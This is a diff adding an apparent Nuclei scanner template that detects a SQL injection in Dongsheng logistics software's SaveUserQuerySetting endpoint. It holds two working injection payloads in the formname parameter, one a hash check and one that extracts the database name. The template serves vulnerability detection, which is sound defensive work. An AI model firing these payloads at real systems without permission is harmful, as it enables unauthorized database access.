@@ -1,0 +1,58 @@
+id: dongsheng-logistics-sqli
+
+info:
+  name: Dongsheng Logistics Software SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Dongsheng logistics software /MvcShipping/MsBaseInfo/SaveUserQuerySetting interface is vulnerable to a SQL injection via the formname parameter. Exploiting this vulnerability allows attackers to retrieve sensitive database information or potentially execute commands on the server.
+  tags: sqli
+
+http:
+  - raw:
+      - |
+        POST /MvcShipping/MsBaseInfo/SaveUserQuerySetting HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Language: zh-CN,zh;q=0.8
+        Accept: */*
+        User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 info
+        Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
+        Connection: keep-alive
+        Referer: http://www.baidu.com
+        Cache-Control: max-age=0
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        formname=MsRptSaleBalProfitShareIndex' AND 1020 IN (select sys.fn_sqlvarbasetostr(hashbytes('MD5','5'))) AND 'XoPV'='XoPV&isvisible=true&issavevalue=true&querydetail={"PS_MBLNO":"","PS_VESSEL":"","PS_VOYNO":"","PS_SALE":"\u91d1\u78ca","PS_OP":null,"PS_EXPDATEBGN":"2020-02-01","PS_EXPDATEEND":"2020-02-29","PS_STLDATEBGN":"","PS_STLDATEEND":"","PS_ACCDATEBGN":"","PS_ACCDATEEND":"","checkboxfield-1188-inputEl":"on","PS_CUSTSERVICE":null,"PS_DOC":null,"hiddenfield-1206-inputEl":""}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "e4da3b7fbbce2345d7772b0674a318d5"
+
+  - raw:
+      - |
+        POST /MvcShipping/MsBaseInfo/SaveUserQuerySetting HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Language: zh-CN,zh;q=0.8
+        Accept: */*
+        User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 info
+        Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
+        Connection: keep-alive
+        Referer: http://www.baidu.com
+        Cache-Control: max-age=0
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        formname=MsRptSaleBalProfitShareIndex'+AND+2523+IN+(SELECT+(CHAR(113)%2bCHAR(120)%2bCHAR(112)%2bCHAR(113)%2bCHAR(113)%2b(SELECT+SUBSTRING((ISNULL(CAST(db_name()+AS+NVARCHAR(4000)),CHAR(32))),1,1024))%2bCHAR(113)%2bCHAR(122)%2bCHAR(107)%2bCHAR(113)%2bCHAR(113)))+AND+'uKco'%3d'uKco&isvisible=true&issavevalue=true&querydetail=%7B%22PS_MBLNO%22%3A%22%22%2C%22PS_VESSEL%22%3A%22%22%2C%22PS_VOYNO%22%3A%22%22%2C%22PS_SALE%22%3A%22%5Cu91d1%5Cu78ca%22%2C%22PS_OP%22%3Anull%2C%22PS_EXPDATEBGN%22%3A%222020-02-01%22%2C%22PS_EXPDATEEND%22%3A%222020-02-29%22%2C%22PS_STLDATEBGN%22%3A%22%22%2C%22PS_STLDATEEND%22%3A%22%22%2C%22PS_ACCDATEBGN%22%3A%22%22%2C%22PS_ACCDATEEND%22%3A%22%22%2C%22checkboxfield-1188-inputEl%22%3A%22on%22%2C%22PS_CUSTSERVICE%22%3Anull%2C%22PS_DOC%22%3Anull%2C%22hiddenfield-1206-inputEl%22%3A%22%22%7D
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "qxpqq(.*)qzkqq"
